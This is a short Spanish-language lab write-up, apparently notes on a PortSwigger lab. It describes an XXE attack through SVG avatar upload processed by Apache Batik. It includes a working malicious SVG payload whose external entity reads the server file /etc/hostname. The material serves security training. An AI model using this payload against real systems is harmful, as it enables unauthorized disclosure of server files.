# XXE vía subida de imagen maliciosa

Tags: #XXE #PortSwigger #XML 

```bash 
En este lab se sigue explorando vectores de ataque XXE, esta vez aprovechando la funcionalidad de subida de imágenes del laboratorio. El servidor permite a los usuarios subir avatares en formato SVG, los cuales son procesados con la librería Apache Batik. Esta librería interpreta entidades definidas dentro del SVG, lo que abre la puerta a un ataque XXE clásico.


- SVG: Los gráficos vectoriales escalables o gráficos vectoriales redimensionales es un formato de gráficos vectoriales bidimensionales, tanto estáticos como animados, en formato de lenguaje de marcado
```

```xml 
<!-- Se crea un archivo llamado image.svg y se coloca el siguiente contenido -->

<?xml version="1.0" standalone="yes"?>
	<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>   
	<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
		<text font-size="16" x="0" y="16">&xxe;</text>
	</svg>
```